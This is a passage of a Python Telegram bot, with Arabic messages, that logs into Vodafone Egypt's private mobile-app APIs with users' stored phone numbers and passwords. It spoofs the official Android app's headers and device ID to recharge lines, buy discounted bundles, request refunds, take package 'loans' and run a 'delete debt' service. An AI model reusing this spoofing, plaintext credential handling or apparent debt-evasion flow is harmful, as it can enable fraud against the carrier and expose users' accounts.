        return
    
    user_data['target_phone'] = target_phone
    bot_status['user_data'][user_id]['action'] = 'recharge_waiting_card'
    user_bot.send_message(
        user_id,
        f"{EMOJI['info']} *أدخل رقم الكارت:*",
        parse_mode='Markdown'
    )

def handle_recharge_card(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'recharge_waiting_card':
        return
    
    card_number = message.text.strip()
    if not card_number.isdigit():
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم الكارت يجب أن يحتوي على أرقام فقط!*", parse_mode='Markdown')
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    target_phone = user_data.get('target_phone', phone)
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري شحن الكارت...*", parse_mode='Markdown')
    
    # تسجيل الدخول
    success, token = login_recharge(phone, password)
    if not success:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
        del bot_status['user_data'][user_id]
        return
    
    # شحن الكارت
    success, message = recharge_card(phone, token, card_number, target_phone)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {message}\n\n📱 الرقم المشحون: `{target_phone}`", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

# ==================== دوال خدمة خصم فليكس (مع تأكيد) ====================
def handle_flex_discount_service(user_id):
    """خدمة خصم فليكس - عرض الخصم المتاح أولاً ثم تأكيد"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    # إنشاء كائن الخصم وجلب العروض
    discount_bot = VodafoneDiscountAuto()
    if not discount_bot.login(phone, password):
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
        return
    
    offers_data = discount_bot.get_discount_offers()
    if not offers_data:
        user_bot.send_message(user_id, f"{EMOJI['error']} *لا توجد عروض متاحة*", parse_mode='Markdown')
        return
    
    all_offers = discount_bot.extract_all_discount_offers(offers_data)
    if not all_offers:
        user_bot.send_message(user_id, f"{EMOJI['error']} *لم أجد عروض خصم متاحة*", parse_mode='Markdown')
        return
    
    # عرض أفضل عرض
    best_offer = all_offers[0]
    offer_text = f"{EMOJI['flex_discount']} *عرض خصم فليكس متاح:*\n\n"
    offer_text += f"📦 الباقة: {best_offer['bundle_name']}\n"
    offer_text += f"💰 السعر الأصلي: {best_offer['original_price']} جنيه\n"
    offer_text += f"💸 سعر الخصم: {best_offer['discounted_price']} جنيه\n"
    offer_text += f"✨ نسبة الخصم: {best_offer['discount_percentage']:.1f}%\n"
    offer_text += f"📝 الوصف: {best_offer['desc']}\n\n"
    offer_text += f"⚠️ ملاحظة: سيتم تفعيل العرض مباشرة على خطك."
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"✅ تأكيد التفعيل", callback_data=f"confirm_discount_{best_offer['product_id']}_{best_offer['tariff_id']}"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    
    # تخزين معلومات العرض في bot_status
    bot_status['user_data'][user_id] = {
        'action': 'flex_discount_confirm',
        'phone': phone,
        'password': password,
        'offer': best_offer
    }
    
    user_bot.send_message(user_id, offer_text, parse_mode='Markdown', reply_markup=markup)

def handle_confirm_discount_callback(call, user_id, product_id, tariff_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'flex_discount_confirm':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها، يرجى إعادة المحاولة")
        return
    
    offer = user_data.get('offer')
    if not offer:
        user_bot.answer_callback_query(call.id, "حدث خطأ في العرض")
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    
    user_bot.answer_callback_query(call.id, "جاري تفعيل العرض...")
    
    # إعادة إنشاء كائن الخصم
    discount_bot = VodafoneDiscountAuto()
    if not discount_bot.login(phone, password):
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
        del bot_status['user_data'][user_id]
        return
    
    success, message = discount_bot.purchase_offer(offer)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

# ==================== دوال خدمة الماني باك (من ماني_باك__2_.py - النسخة المحدثة) ====================
def handle_moneyback_service(user_id):
    """خدمة الماني باك - عرض قائمة خيارات بأزرار سفلية ثابتة"""
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]

    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return

    bot_status['user_data'][user_id] = {'action': 'moneyback_menu'}

    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.row(
        types.KeyboardButton(text="🔍 تفاصيل الماني باك"),
        types.KeyboardButton(text="💰 استرجاع الباقة")
    )
    markup.row(
        types.KeyboardButton(text="💳 رصيد الماني باك"),
        types.KeyboardButton(text="🔄 تحديث البيانات")
    )
    markup.row(types.KeyboardButton(text=f"{EMOJI['back']} الرجوع للقائمة الرئيسية"))

    user_bot.send_message(
        user_id,
        f"{EMOJI['moneyback']} *خدمة الماني باك*\n\n👇 اختر العملية المطلوبة:",
        parse_mode='Markdown',
        reply_markup=markup
    )


def _get_vf_instance(user_id):
    """مساعد: إنشاء كائن VodafoneMoneyBack مسجّل الدخول للمستخدم"""
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        return None, None, None
    phone = session['phone']
    password = session.get('password', '')

    existing_token = session.get('bearer_token') or session.get('access_token') or session.get('token')
    if existing_token and existing_token.startswith('Bearer '):
        existing_token = existing_token[7:]

    vf = VodafoneMoneyBack()

    if existing_token:
        vf.token = existing_token
        vf.phone = phone
        vf.password = password
        vf.session.headers.update({
            'Authorization': f'Bearer {existing_token}',
            'msisdn': phone
        })
    elif password:
        success, msg = vf.login(phone, password)
        if not success:
            return None, phone, None
    else:
        return None, phone, None

    return vf, phone, password


def handle_moneyback_details(call, user_id):
    """عرض تفاصيل عمليات الماني باك"""
    try:
        user_bot.answer_callback_query(call.id)
    except:
        pass
    msg = user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب التفاصيل...*", parse_mode='Markdown')
    vf, phone, _ = _get_vf_instance(user_id)
    if not vf:
        user_bot.edit_message_text(f"{EMOJI['error']} *فشل تسجيل الدخول!*", msg.chat.id, msg.message_id, parse_mode='Markdown')
        return

    usage_data = vf.get_usage_data(days=30)
    all_ops = vf.parse_moneyback_operations(usage_data) if usage_data else []

    if not all_ops:
        if not usage_data:
            msg_text = "❌ *فشل جلب بيانات الاستخدام*\n\nتحقق من الاتصال أو أعد تسجيل الدخول"
        else:
            total_items = len(usage_data) if isinstance(usage_data, list) else 0
            msg_text = f"📭 *لا توجد عمليات ماني باك خلال آخر 30 يوم*\n\n_(إجمالي العمليات في الفترة: {total_items})_"
        user_bot.edit_message_text(msg_text, msg.chat.id, msg.message_id, parse_mode='Markdown')
        return

    sorted_ops = sorted(all_ops, key=lambda x: x['date'], reverse=True)
    text = f"🔍 *تفاصيل الماني باك - آخر 30 يوم*\n📊 عدد العمليات: {len(all_ops)}\n\n"
    for i, op in enumerate(sorted_ops[:5], 1):
        text += f"*{i}.* {op['description']}\n"
        text += f"   💰 {op['amount']} جنيه | 📅 {op['readable_date']}\n\n"

    user_bot.edit_message_text(text, msg.chat.id, msg.message_id, parse_mode='Markdown')


def handle_moneyback_refund_menu(call, user_id):
    """عرض الباقات القابلة للاسترداد"""
    try:
        user_bot.answer_callback_query(call.id)
    except:
        pass
    msg = user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب الباقات...*", parse_mode='Markdown')
    vf, phone, password = _get_vf_instance(user_id)
    if not vf:
        user_bot.edit_message_text(f"{EMOJI['error']} *فشل تسجيل الدخول!*", msg.chat.id, msg.message_id, parse_mode='Markdown')
        return

    balance_data = vf.get_consumption_data()
    balance = vf.extract_moneyback_balance(balance_data)
    balance_text = f"\n{EMOJI['moneyback']} *الرصيد الحالي:* {balance.get('amount')} {balance.get('units')}\n" if balance else ""

    usage_data = vf.get_usage_data()
    all_offers = vf.parse_moneyback_operations(usage_data) if usage_data else []
    offers = [op for op in all_offers if op.get('refundable', False) and op.get('enc_product_id')]

    if not offers:
        total_ops = len(all_offers)
        if total_ops > 0:
            no_refund_msg = f"{EMOJI['error']} *لم يتم العثور على باقات قابلة للاسترداد*{balance_text}\n\n📊 عدد العمليات الكلي: {total_ops}\n💡 الباقات الموجودة مستهلكة أو غير مؤهلة للاسترداد"
        else:
            no_refund_msg = f"{EMOJI['error']} *لا توجد عمليات خلال آخر 30 يوم*{balance_text}"
        user_bot.edit_message_text(no_refund_msg, msg.chat.id, msg.message_id, parse_mode='Markdown')
        return

    bot_status['user_data'][user_id] = {'vf': vf, 'offers': offers, 'action': 'moneyback_waiting_selection'}

    markup = types.InlineKeyboardMarkup(row_width=1)
    for i, opt in enumerate(offers, 1):
        button_text = f"{i}. {opt['description'][:40]} - {opt['amount']} جنيه ✅"
        markup.add(types.InlineKeyboardButton(text=button_text, callback_data=f"moneyback_refund_{i-1}"))

    user_bot.edit_message_text(
        f"{EMOJI['moneyback']} *باقات الماني باك القابلة للاسترداد*{balance_text}\n\n👇 اختر الباقة المراد استردادها:",
        msg.chat.id, msg.message_id, parse_mode='Markdown', reply_markup=markup
    )


def handle_moneyback_balance(call, user_id):
    """عرض رصيد الماني باك"""
    try:
        user_bot.answer_callback_query(call.id)
    except:
        pass
    msg = user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب الرصيد...*", parse_mode='Markdown')
    try:
        vf, phone, _ = _get_vf_instance(user_id)
        if not vf:
            user_bot.edit_message_text(f"{EMOJI['error']} *فشل تسجيل الدخول!*", msg.chat.id, msg.message_id, parse_mode='Markdown')
            return

        balance_data = vf.get_consumption_data()
        balance = vf.extract_moneyback_balance(balance_data)

        if balance:
            amount = balance.get('amount', 0)
            unit = balance.get('units', 'جنيه')
            try:
                has_balance = float(str(amount)) >= 590
            except:
                has_balance = False
            text = (
                f"💳 *رصيد الماني باك المتبقي*\n\n"
                f"💰 المبلغ: *{amount} {unit}*\n"
                f"📱 الرقم: `{phone}`\n"
                f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            )
            if has_balance:
                text += f"\n\n✅ متاح موني باك"
            else:
                text += f"\n\n❌ غير متاح موني باك"
        else:
            text = f"⚠️ *فشل جلب رصيد الموني باك*\n\nولكن الموني باك متاح ليك ✅"

        user_bot.edit_message_text(text, msg.chat.id, msg.message_id, parse_mode='Markdown')
    except Exception as e:
        try:
            user_bot.edit_message_text(f"{EMOJI['error']} *حدث خطأ غير متوقع*\n\n`{str(e)[:100]}`", msg.chat.id, msg.message_id, parse_mode='Markdown')
        except:
            pass


def handle_moneyback_refresh(call, user_id):
    """تحديث بيانات الماني باك"""
    try:
        user_bot.answer_callback_query(call.id, "🔄 جاري تحديث البيانات...")
    except:
        pass
    msg = user_bot.send_message(user_id, f"🔄 *جاري تحديث البيانات...*", parse_mode='Markdown')
    vf, phone, _ = _get_vf_instance(user_id)
    if not vf:
        user_bot.edit_message_text(f"{EMOJI['error']} *فشل تسجيل الدخول!*", msg.chat.id, msg.message_id, parse_mode='Markdown')
        return

    usage_data = vf.get_usage_data(days=30)
    all_ops = vf.parse_moneyback_operations(usage_data) if usage_data else []
    balance_data = vf.get_consumption_data()
    balance = vf.extract_moneyback_balance(balance_data)

    balance_text_val = "غير متاح"
    if balance:
        b_amount = balance.get('amount', 0)
        b_units = balance.get('units', 'جنيه')
        balance_text_val = f"{b_amount} {b_units}"
    ops_count = len(all_ops)
    refundable_count = len([op for op in all_ops if op.get('refundable', False)])

    text = (
        f"✅ *تم تحديث البيانات بنجاح*\n\n"
        f"📊 عدد العمليات: {ops_count}\n"
        f"♻️ الباقات القابلة للاسترداد: {refundable_count}\n"
        f"💰 رصيد الماني باك: {balance_text_val}"
    )
    user_bot.edit_message_text(text, msg.chat.id, msg.message_id, parse_mode='Markdown')


def handle_moneyback_refund_callback(call, user_id, offer_index):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'moneyback_waiting_selection':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها، يرجى إعادة المحاولة")
        return
    
    offers = user_data.get('offers', [])
    vf = user_data.get('vf')
    
    try:
        idx = int(offer_index)
        if idx < 0 or idx >= len(offers):
            user_bot.answer_callback_query(call.id, "باقة غير صالحة")
            return
        selected_offer = offers[idx]
    except:
        user_bot.answer_callback_query(call.id, "خطأ في الاختيار")
        return
    
    bot_status['user_data'][user_id]['pending_offer_idx'] = idx
    bot_status['user_data'][user_id]['action'] = 'moneyback_confirm'
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد الاسترداد", callback_data=f"moneyback_confirm_{idx}"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    
    user_bot.answer_callback_query(call.id)
    user_bot.send_message(
        user_id,
        f"{EMOJI['moneyback']} *تأكيد الاسترداد*\n\n📦 الباقة: {selected_offer['description']}\n💰 المبلغ: {selected_offer['amount']} جنيه\n\nهل تريد استرداد هذه الباقة؟",
        parse_mode='Markdown',
        reply_markup=markup
    )


def execute_moneyback_refund(call, user_id, offer_index):
    """تنفيذ الاسترداد بعد التأكيد"""
    user_data = bot_status['user_data'].get(user_id, {})
    offers = user_data.get('offers', [])
    vf = user_data.get('vf')
    
    try:
        idx = int(offer_index)
        selected_offer = offers[idx]
    except:
        user_bot.answer_callback_query(call.id, "خطأ في الاختيار")
        return
    
    user_bot.answer_callback_query(call.id, f"جاري طلب استرداد {selected_offer['amount']} جنيه...")
    
    success, message = vf.refund_bundle(selected_offer['enc_product_id'], selected_offer)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} *تم طلب الاسترداد بنجاح!*\n\n{message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل طلب الاسترداد!*\n\n{message}", parse_mode='Markdown')
    
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]

# ==================== دوال خدمة تفعيل 21000 فليكس ====================
def run_activate_21000_flex(phone: str, password: str) -> Tuple[bool, str]:
    """تفعيل باقة 21000 فليكس (نوته فليكس 300)"""
    try:
        # استخدام نفس دالة تفعيل الباقة من NOTE_PACKAGES (Flex 300)
        selected_package = None
        for pkg in NOTE_PACKAGES:
            if pkg['name'] == "فليكس 300":
                selected_package = pkg
                break
        
        if not selected_package:
            return False, "❌ لم يتم العثور على باقة فليكس 300"
        
        auth_result = get_authorization(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        result = request_note_package_loan(token, phone, selected_package)
        
        if result['success']:
            return True, f"✅ تم تفعيل باقة 21000 فليكس بنجاح!\n\n📱 الرقم: `{phone}`\n💰 السعر: {selected_package['value']} جنيه\n\nالباقة ستظهر في اشتراكاتك وتتفعل عند الشحن"
        else:
            return False, f"❌ {result['message']}"
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def handle_activate_21000_service(user_id):
    """خدمة تفعيل 21000 فليكس"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    # تخزين البيانات وعرض تأكيد
    bot_status['user_data'][user_id] = {
        'action': 'activate21000_confirm',
        'phone': phone,
        'password': password
    }
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد التفعيل", callback_data="activate21000_confirm"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['activate_21000']} *تفعيل 21000 فليكس*\n\n📱 الرقم: `{phone}`\n📦 الباقة: فليكس 300 (21000 فليكس)\n💰 السعر: 300 جنيه\n\n⚠️ هل تريد تفعيل هذه الباقة؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

def execute_activate_21000(call, user_id):
    """تنفيذ تفعيل 21000 فليكس بعد التأكيد"""
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'activate21000_confirm':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    
    user_bot.answer_callback_query(call.id, "جاري التفعيل...")
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل باقة 21000 فليكس...*", parse_mode='Markdown')
    
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
    
    success, message = run_activate_21000_flex(phone, password)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')


# ==================== دوال خدمة عروض ريح بالك ====================
def handle_riha_balak_service(user_id):
    """خدمة عروض ريح بالك - جلب العروض المتاحة وعرضها بأزرار"""
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]

    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return

    phone = session['phone']
    access_token = session.get('bearer_token') or session.get('access_token') or session.get('token')

    # تنظيف "Bearer " من البداية لو موجودة
    if access_token and access_token.startswith('Bearer '):
        access_token = access_token[7:]

    if not access_token:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل الحصول على التوكن!*\n\nيرجى إعادة تسجيل الدخول", parse_mode='Markdown')
        return

    msg = user_bot.send_message(user_id, f"{EMOJI['riha_balak_offers']} *جاري جلب عروض ريح بالك...*\n\n⏳ انتظر لحظة...", parse_mode='Markdown')

    try:
        # جلب العروض المتاحة
        url = "https://mobile.vodafone.com.eg/mobile-app-upgrade/promo/unifiedEligiblityPromo"
        payload = {
            "channelId": 1,
            "crplan": "prepaid",
            "ctId": 1470.0,
            "inquireCurrentGifts": 0,
            "inquireEligibleGifts": 0,
            "inquireHistoryGifts": 0,
            "inquiryCustomerInfo": 0,
            "language": "ar",
            "operationId": 0,
            "param1": 0,
            "param11": 0,
            "param12": 0,
            "param13": 0,
            "param14": 0,
            "param2": 0,
            "param4": 0,
            "serviceType": "MIPTopOffers",
            "triggerId": 0,
            "wlistId": 0
        }
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Authorization': f"Bearer {access_token}",
            'api-version': "v2",
            'device-id': "81bfbfaa09602859",
            'x-agent-operatingsystem': "16",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "HONOR DNY-NX9",
            'x-agent-version': "2025.11.1",
            'x-agent-build': "1063",
            'msisdn': phone,
            'buildNumber': "1063",
            'operatingSystem': "10.0.0.165C185E3R2P2",
            'platform': "Android",
            'deviceType': "HNDNYX",
            'Content-Type': "application/json; charset=UTF-8"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=30)

        # معالجة خطأ 401 بوضوح
        if response.status_code == 401:
            user_bot.edit_message_text(
                f"{EMOJI['error']} *انتهت صلاحية الجلسة (401)*\n\nيرجى تسجيل الخروج وإعادة تسجيل الدخول باستخدام /start",
                msg.chat.id, msg.message_id, parse_mode='Markdown'
            )
            return

        offers_data = response.json()

        # استخراج قائمة العروض - بحث شامل في كل مستويات الاستجابة
        gifts_list = []

        def deep_find_gifts(obj, depth=0):
            if depth > 6 or not isinstance(obj, (dict, list)):
                return []
            if isinstance(obj, list):
                if obj and isinstance(obj[0], dict) and any(k in obj[0] for k in ['giftName', 'offerName', 'giftId', 'offerId', 'giftFees']):
                    return obj
                for item in obj:
                    r = deep_find_gifts(item, depth + 1)
                    if r:
                        return r
            if isinstance(obj, dict):
                for key in ['gifts', 'offers', 'items', 'promotions', 'promos', 'offerList', 'giftList', 'topOffers', 'eligibleOffers']:
                    if key in obj and isinstance(obj[key], list) and obj[key]:
                        return obj[key]
                for key, value in obj.items():
                    r = deep_find_gifts(value, depth + 1)
                    if r:
                        return r
            return []

        if 'gifts' in offers_data and isinstance(offers_data.get('gifts'), list):
            gifts_list = offers_data['gifts']
        elif 'offers' in offers_data and isinstance(offers_data.get('offers'), list):
            gifts_list = offers_data['offers']
        elif 'data' in offers_data and isinstance(offers_data.get('data'), dict) and 'gifts' in offers_data['data']:
            gifts_list = offers_data['data']['gifts']
        else:
            gifts_list = deep_find_gifts(offers_data)

        if not gifts_list:
            user_bot.edit_message_text(
                f"{EMOJI['info']} *لا توجد عروض ريح بالك متاحة حالياً*\n\nحاول مرة أخرى لاحقاً\n\n_كود الاستجابة: {response.status_code}_",
                msg.chat.id, msg.message_id, parse_mode='Markdown'
            )
            return

        # حفظ العروض في بيانات المستخدم
        bot_status['user_data'][user_id] = {
            'action': 'riha_balak_waiting_selection',
            'riha_offers': gifts_list,
            'phone': phone,
            'access_token': access_token
        }

        # بناء أزرار العروض
        markup = types.InlineKeyboardMarkup()
        for i, gift in enumerate(gifts_list):
            gift_name = gift.get('giftName', gift.get('offerName', gift.get('name', f'عرض {i+1}')))
            gift_fees = gift.get('giftFees', gift.get('price', gift.get('cost', gift.get('fees', '0'))))
            if isinstance(gift_fees, dict):
                gift_fees = gift_fees.get('value', gift_fees.get('amount', '0'))
            btn_text = f"🎁 {gift_name} - {gift_fees} جنيه"
            markup.add(types.InlineKeyboardButton(text=btn_text, callback_data=f"riha_offer_{i}"))

        markup.add(types.InlineKeyboardButton(text="❌ إلغاء", callback_data="riha_balak_cancel"))

        user_bot.edit_message_text(
            f"{EMOJI['riha_balak_offers']} *عروض ريح بالك المتاحة*\n\n"
            f"📱 الرقم: `{phone}`\n"
            f"📦 عدد العروض: {len(gifts_list)}\n\n"
            f"👇 اختر العرض المراد تفعيله:",
            msg.chat.id, msg.message_id,
            parse_mode='Markdown',
            reply_markup=markup
        )

    except Exception as e:
        user_bot.edit_message_text(
            f"{EMOJI['error']} *حدث خطأ أثناء جلب العروض*\n\n`{str(e)[:100]}`",
            msg.chat.id, msg.message_id, parse_mode='Markdown'
        )


def handle_riha_balak_offer_selection(call, user_id, offer_index):
    """معالجة اختيار عرض ريح بالك"""
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'riha_balak_waiting_selection':
        user_bot.answer_callback_query(call.id, "❌ انتهت الجلسة، أعد المحاولة")
        return

    try:
        idx = int(offer_index)
    except:
        user_bot.answer_callback_query(call.id, "❌ خطأ في الاختيار")
        return

    gifts_list = user_data.get('riha_offers', [])
    if idx >= len(gifts_list):
        user_bot.answer_callback_query(call.id, "❌ العرض غير موجود")
        return

    selected = gifts_list[idx]
    gift_name = selected.get('giftName', selected.get('offerName', selected.get('name', 'عرض')))
    gift_fees = selected.get('giftFees', selected.get('price', selected.get('cost', '0')))
    if isinstance(gift_fees, dict):
        gift_fees = gift_fees.get('value', gift_fees.get('amount', '0'))
    gift_id = selected.get('giftId', selected.get('offerId', selected.get('id', None)))

    bot_status['user_data'][user_id]['action'] = 'riha_balak_confirm'
    bot_status['user_data'][user_id]['selected_offer'] = {
        'idx': idx,
        'name': gift_name,
        'id': gift_id,
        'fees': gift_fees,
        'raw': selected
    }

    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("✅ تأكيد التفعيل", callback_data="riha_balak_confirm"),
        types.InlineKeyboardButton("❌ إلغاء", callback_data="riha_balak_cancel")
    )

    user_bot.answer_callback_query(call.id)
    user_bot.edit_message_text(
        f"{EMOJI['riha_balak_offers']} *تأكيد تفعيل العرض*\n\n"
        f"🎁 العرض: {gift_name}\n"
        f"💰 السعر: {gift_fees} جنيه\n\n"
        f"⚠️ هل تريد تفعيل هذا العرض؟",
        call.message.chat.id, call.message.message_id,
        parse_mode='Markdown',
        reply_markup=markup
    )


def execute_riha_balak_offer(call, user_id):
    """تنفيذ تفعيل عرض ريح بالك"""
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'riha_balak_confirm':
        user_bot.answer_callback_query(call.id, "❌ انتهت الجلسة")
        return

    selected = user_data.get('selected_offer')
    if not selected:
        user_bot.answer_callback_query(call.id, "❌ لم يتم اختيار عرض")
        return

    phone = user_data.get('phone')
    access_token = user_data.get('access_token')
    gift_id = selected.get('id')
    gift_fees = selected.get('fees')
    gift_name = selected.get('name')

    user_bot.answer_callback_query(call.id)
    user_bot.edit_message_text(
        f"⏳ *جاري تفعيل العرض...*\n\n🎁 {gift_name}",
        call.message.chat.id, call.message.message_id, parse_mode='Markdown'
    )

    try:
        offer_id_number = str(gift_id).replace("Flex_2024_", "") if gift_id else ""
        url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
        payload = {
            "channel": {"name": "MobileApp"},
            "orderItem": [
                {
                    "action": "add",
                    "id": gift_id,
                    "itemPrice": [
                        {
                            "name": "OriginalPrice",
                            "price": {
                                "taxIncludedAmount": {
                                    "unit": "LE",
                                    "value": str(gift_fees)
                                }
                            }
                        }
                    ],
                    "product": {
                        "characteristic": [
                            {"name": "TariffRank", "value": ""},
                            {"name": "TariffID", "value": offer_id_number},
                            {"name": "Quota", "@type": "NONE", "value": "0"},
                            {"name": "Validity", "@type": "MONTH", "value": "1"},
                            {"name": "MaxAdjustmentNumber", "value": "1"},
                            {"name": "OfferRank", "value": "1"},
                            {"name": "MigrationDesc", "value": "Top Offers Migration"},
                            {"name": "CohortId", "value": "11"}
                        ],
                        "productSpecification": [
                            {"id": "Upselling With Offer", "name": "Category"},
                            {"id": "Upon Migration", "name": "MigrationRule"},
                            {"id": "0", "name": "RatePlanType"},
                            {"id": "Flex Family", "name": "BundleType"}
                        ],
                        "relatedParty": [
                            {"id": phone, "name": "MSISDN", "@referredType": "prepaid", "role": "Subscriber"},
                            {"id": "1470", "name": "TariffID", "@referredType": "prepaid", "role": "TariffID"}
                        ]
                    },
                    "@type": "Access fees Discount",
                    "eCode": 0
                }
            ],
            "@type": "InterventionTariff"
        }
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'api-host': "ProductOrderingManagement",
            'useCase': "InterventionTariff",
            'Authorization': f"Bearer {access_token}",
            'api-version': "v2",
            'device-id': "81bfbfaa09602859",
            'x-agent-operatingsystem': "16",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "HONOR DNY-NX9",
            'x-agent-version': "2025.11.1",
            'x-agent-build': "1063",
            'msisdn': phone,
            'Accept-Language': "ar",
            'Content-Type': "application/json; charset=UTF-8"
        }

        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        result = response.json()

        if response.status_code in [200, 400]:
            if isinstance(result, dict):
                code = result.get('code', '')
                status = str(result.get('status', '')).upper()
                if code == '1008' or status == 'SUCCESS':
                    user_bot.edit_message_text(
                        f"{EMOJI['success']} *تم تفعيل العرض بنجاح!* 🎉\n\n"
                        f"🎁 العرض: {gift_name}\n"
                        f"💰 السعر: {gift_fees} جنيه\n\n"
                        f"📢 يرجى الشحن 💳",
                        call.message.chat.id, call.message.message_id, parse_mode='Markdown'
                    )
                else:
                    reason = result.get('reason', result.get('message', str(result)[:100]))
                    user_bot.edit_message_text(
                        f"{EMOJI['error']} *فشل تفعيل العرض*\n\n"
                        f"🎁 العرض: {gift_name}\n"
                        f"⚠️ السبب: {reason}",
                        call.message.chat.id, call.message.message_id, parse_mode='Markdown'
                    )
            else:
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل تفعيل العرض*\n\nاستجابة غير متوقعة من السيرفر",
                    call.message.chat.id, call.message.message_id, parse_mode='Markdown'
                )
        else:
            user_bot.edit_message_text(
                f"{EMOJI['error']} *فشل تفعيل العرض*\n\nكود الخطأ: {response.status_code}",
                call.message.chat.id, call.message.message_id, parse_mode='Markdown'
            )

    except Exception as e:
        user_bot.edit_message_text(
            f"{EMOJI['error']} *حدث خطأ أثناء التفعيل*\n\n`{str(e)[:100]}`",
            call.message.chat.id, call.message.message_id, parse_mode='Markdown'
        )

    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]

# ==================== دوال خدمة حذف مديونية 21000 فليكس ====================
def handle_delete_debt_21000_service(user_id):
    """خدمة حذف مديونية 21000 فليكس - استخدام ريح بالك اجباري"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
    # نفس وظيفة ريح بالك اجباري
    handle_rahatabalk_egjbary_service(user_id)

def execute_rahatabalk_egjbary(call, user_id):
    """تنفيذ ريح بالك اجباري بعد التأكيد - باستخدام API جديد"""
    user_data = bot_status['user_data'].get(user_id, {})
